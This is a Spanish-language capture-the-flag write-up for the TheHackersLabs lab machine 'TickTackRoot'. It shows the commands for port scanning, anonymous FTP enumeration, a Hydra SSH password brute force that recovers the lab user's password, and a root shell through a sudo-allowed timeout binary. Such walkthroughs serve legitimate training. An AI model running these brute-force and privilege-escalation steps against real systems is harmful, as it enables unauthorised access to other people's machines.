# 🏁  Resolución del CTF "TickTackRoot" | TheHackersLabs

**Plataforma:** TheHackersLabs  
**Nombre de la máquina:** TickTackRoot  
**Dificultad:** Fácil  
**Enfoque:** FTP Anónimo, Fuerza Bruta con Hydra y Escalada con Binario SUID personalizado

---

## 🔍 1. Escaneo de puertos

Se ejecutó un escaneo con Nmap:

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.20.10.6 -oN escaneo.txt
```

<img width="827" height="637" alt="1-nmap" src="https://github.com/user-attachments/assets/c480c607-5c31-4d21-ac2d-38cfca48f3be" /><br>

<img width="485" height="212" alt="1-nmap2" src="https://github.com/user-attachments/assets/43e2fd6d-7847-4a3a-8acb-0d05d5b24de6" /><br>

Puertos abiertos:

- 21/tcp → FTP (vsftpd 3.0.5, permite acceso anónimo)

- 22/tcp → SSH

- 80/tcp → Apache httpd 2.4.58 (Ubuntu)

---

## 📂 2. Enumeración del servicio FTP

Se permitió acceso anónimo, y al conectarse se mostró el mensaje:

```bash
ftp 172.20.10.6
```

<img width="203" height="109" alt="2-ftp-anonymous" src="https://github.com/user-attachments/assets/de4ac8e1-0877-4a02-af6b-c854b84729f2" /><br>

```text
220 Bienvenido Robin
```

Este banner fue clave para orientar la fuerza bruta posterior.<br>

Navegando por el FTP se accedió al directorio /login donde se descargó login.txt:

```bash
get login.txt
```

<img width="356" height="241" alt="3-get-login txt" src="https://github.com/user-attachments/assets/1b1e6d7d-d833-49dd-bbcc-fa4f8713267d" /><br>

Contenido del fichero:

```nginx
rafael
monica
```

<img width="161" height="71" alt="4-cat-login txt" src="https://github.com/user-attachments/assets/d8b4fc0e-aad2-465e-ad1e-3e0baad58b75" />

---

## 🔐 3. Ataque de fuerza bruta con Hydra

Aunque inicialmente se probó con rafael y monica, se descubrió (al revisar el banner) que el nombre Robin era un posible usuario válido.<br>

Ataque final exitoso:

```bash
hydra -l robin -P /usr/share/wordlists/rockyou.txt ssh://172.20.10.6 -f
```

<img width="592" height="127" alt="5-hydra-robin" src="https://github.com/user-attachments/assets/bd83441f-a32d-4509-9f16-ec23c3b6f901" /><br>

Resultado:

```pgsql
login: robin  password: babyblue
```

---

## 💻 4. Acceso SSH como usuario Robin

```bash
ssh robin@172.20.10.6
```

<img width="404" height="418" alt="6-ssh-login" src="https://github.com/user-attachments/assets/c2e472a7-32a8-432c-b34f-9dc78f1be112" /><br>

Credenciales válidas, acceso exitoso al sistema:

```css
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)
```

---

## 🧨 5. Escalada de privilegios
Ejecutando:

```bash
sudo -l
```

<img width="635" height="58" alt="7-sudo -l" src="https://github.com/user-attachments/assets/377bc61f-0b02-4e05-bb80-2a996eee4f6d" /><br>

Se encontró:

```bash
(ALL) NOPASSWD: /usr/bin/timeout_suid
```

Buscando en GTFOBins se identificó que timeout (personalizado) permite escalada:

<img width="422" height="104" alt="8-gtfobins" src="https://github.com/user-attachments/assets/1bce8f8f-a3d3-4758-bafe-ed3af22417e1" /><br>

<img width="442" height="29" alt="9-escalada-root" src="https://github.com/user-attachments/assets/16e0ab90-fcac-46c5-84fd-255d7f0f9926" /><br>

```bash
sudo timeout_suid --foreground 7d /bin/sh
```

Esto nos da una shell como root 🏆

---

## 🎯 Conclusión

- ✅ Acceso inicial por FTP anónimo

- ✅ Reconocimiento de nombres de usuarios en login.txt

- ✅ Banner nos revela el usuario Robin

- ✅ Fuerza bruta exitosa con babyblue

- ✅ Escalada con binario timeout_suid
